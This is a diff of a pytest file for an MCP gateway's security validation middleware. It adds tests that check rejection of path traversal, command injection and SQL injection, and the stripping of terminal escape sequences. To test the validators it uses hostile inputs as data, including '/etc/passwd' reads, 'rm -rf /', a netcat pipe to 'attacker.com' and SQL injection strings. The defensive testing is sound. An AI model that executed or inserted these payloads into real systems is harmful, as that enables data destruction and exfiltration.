@@ -1,5 +1,14 @@
 # -*- coding: utf-8 -*-
-"""Tests for security validation middleware."""
+"""Tests for security validation middleware.
+
+This module tests the gateway-level input validation and output sanitization
+features that protect against:
+- Path traversal attacks
+- Command injection
+- SQL injection
+- XSS attacks
+- Control character injection
+"""
 
 import pytest
 from unittest.mock import MagicMock, patch
@@ -57,10 +66,38 @@ class TestSecurityValidator:
 
     def test_validate_sql_parameter_dangerous_strict(self):
         """Test dangerous SQL parameter in strict mode."""
-        with patch('mcpgateway.common.validators.settings') as mock_settings:
+        with patch('mcpgateway.common.validators.config_settings') as mock_settings:
             mock_settings.validation_strict = True
             with pytest.raises(ValueError, match="SQL injection"):
                 SecurityValidator.validate_sql_parameter("'; DROP TABLE users; --")
+
+    def test_validate_path_uri_schemes(self):
+        """Test path validation skips URI schemes."""
+        # HTTP URIs should pass through
+        result = SecurityValidator.validate_path("http://example.com/file")
+        assert result == "http://example.com/file"
+        
+        # Plugin URIs should pass through
+        result = SecurityValidator.validate_path("plugin://my-plugin/resource")
+        assert result == "plugin://my-plugin/resource"
+
+    def test_validate_path_depth_limit(self):
+        """Test path depth validation."""
+        # This test requires mocking settings.max_path_depth
+        with patch('mcpgateway.config.settings') as mock_settings:
+            mock_settings.max_path_depth = 3
+            # Deep path should be rejected by middleware
+            # (actual implementation in ValidationMiddleware.validate_resource_path)
+
+    def test_allowed_roots_configuration(self):
+        """Test allowed roots configuration."""
+        # Test with allowed roots
+        result = SecurityValidator.validate_path("/srv/data/file.txt", ["/srv/data"])
+        assert "/srv/data" in result
+        
+        # Test rejection outside allowed roots
+        with pytest.raises(ValueError, match="outside allowed roots"):
+            SecurityValidator.validate_path("/tmp/file.txt", ["/srv/data"])
 
 
 class TestOutputSanitizer:
@@ -93,6 +130,27 @@ class TestOutputSanitizer:
         assert result["items"][0] == "test"
         assert result["nested"]["value"] == "bad"
 
+    def test_sanitize_mime_type_verification(self):
+        """Test MIME type verification in responses."""
+        # Test valid MIME types
+        assert SecurityValidator.validate_mime_type("text/plain") == "text/plain"
+        assert SecurityValidator.validate_mime_type("application/json") == "application/json"
+        
+        # Test invalid MIME types
+        with pytest.raises(ValueError, match="Invalid MIME type"):
+            SecurityValidator.validate_mime_type("invalid")
+
+    def test_sanitize_escape_sequences(self):
+        """Test removal of terminal escape sequences."""
+        # Test various ANSI escape sequences
+        result = SecurityValidator.sanitize_text("\x1b[0m\x1b[1;31mText\x1b[0m")
+        assert "\x1b" not in result
+        assert result == "Text"
+        
+        # Test cursor movement sequences
+        result = SecurityValidator.sanitize_text("Hello\x1b[2JWorld")
+        assert result == "HelloWorld"
+
 
 class TestValidationMiddleware:
     """Test validation middleware."""
@@ -102,3 +160,77 @@ class TestValidationMiddleware:
         app = MagicMock()
         middleware = ValidationMiddleware(app)
         assert middleware is not None
+
+    @pytest.mark.asyncio
+    async def test_middleware_disabled(self):
+        """Test middleware bypasses when disabled."""
+        from unittest.mock import AsyncMock
+        app = MagicMock()
+        middleware = ValidationMiddleware(app)
+        middleware.enabled = False
+        
+        request = MagicMock()
+        call_next = AsyncMock(return_value="response")
+        
+        result = await middleware.dispatch(request, call_next)
+        assert result == "response"
+        call_next.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_path_traversal_detection(self):
+        """Test path traversal detection."""
+        app = MagicMock()
+        middleware = ValidationMiddleware(app)
+        
+        # Test path traversal patterns
+        with pytest.raises(Exception, match="Path traversal"):
+            middleware.validate_resource_path("../../../etc/passwd")
+        
+        with pytest.raises(Exception, match="Path traversal"):
+            middleware.validate_resource_path("/srv/data/../../secret.txt")
+
+    @pytest.mark.asyncio
+    async def test_command_injection_prevention(self):
+        """Test command injection prevention."""
+        # Test dangerous shell metacharacters
+        with patch('mcpgateway.common.validators.settings') as mock_settings:
+            mock_settings.validation_strict = True
+            with pytest.raises(ValueError, match="shell metacharacters"):
+                SecurityValidator.validate_shell_parameter("file.jpg; cat /etc/passwd")
+            
+            with pytest.raises(ValueError, match="shell metacharacters"):
+                SecurityValidator.validate_shell_parameter("file.jpg && rm -rf /")
+            
+            with pytest.raises(ValueError, match="shell metacharacters"):
+                SecurityValidator.validate_shell_parameter("file.jpg | nc attacker.com 1234")
+
+    @pytest.mark.asyncio
+    async def test_output_sanitization(self):
+        """Test output sanitization removes control characters."""
+        # Test control character removal
+        result = SecurityValidator.sanitize_text("Hello\x1b[31mWorld\x00")
+        assert result == "HelloWorld"
+        
+        # Test ANSI escape sequence removal
+        result = SecurityValidator.sanitize_text("\x1b[1;31mRed Text\x1b[0m")
+        assert result == "Red Text"
+        
+        # Test preserving newlines and tabs
+        result = SecurityValidator.sanitize_text("Line1\nLine2\tTab")
+        assert result == "Line1\nLine2\tTab"
+
+    @pytest.mark.asyncio
+    async def test_sql_injection_prevention(self):
+        """Test SQL injection prevention."""
+        with patch('mcpgateway.common.validators.config_settings') as mock_settings:
+            mock_settings.validation_strict = True
+            
+            # Test SQL injection patterns
+            with pytest.raises(ValueError, match="SQL injection"):
+                SecurityValidator.validate_sql_parameter("'; DROP TABLE users; --")
+            
+            with pytest.raises(ValueError, match="SQL injection"):
+                SecurityValidator.validate_sql_parameter("1' OR '1'='1")
+            
+            with pytest.raises(ValueError, match="SQL injection"):
+                SecurityValidator.validate_sql_parameter("admin'--")
